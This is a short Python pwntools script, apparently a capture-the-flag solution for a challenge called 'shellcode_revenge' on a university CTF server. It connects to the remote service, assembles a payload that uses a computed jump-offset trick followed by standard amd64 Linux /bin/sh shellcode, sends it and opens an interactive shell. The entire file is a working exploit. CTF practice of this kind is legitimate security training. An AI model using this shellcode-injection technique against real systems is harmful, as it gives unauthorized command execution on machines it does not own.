from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11004
p = remote(host, port)

#p = process('./shellcode_revenge')
context.arch = 'amd64'

payload = asm('pop rdx')
payload += asm('lab: ret\n'+'ret\n'*0x200a15+'jmp lab')[-5:]	#0x601059-0x400644 = 0x200a15
payload +=asm(shellcraft.amd64.linux.sh())

p.sendline(payload)
p.interactive()
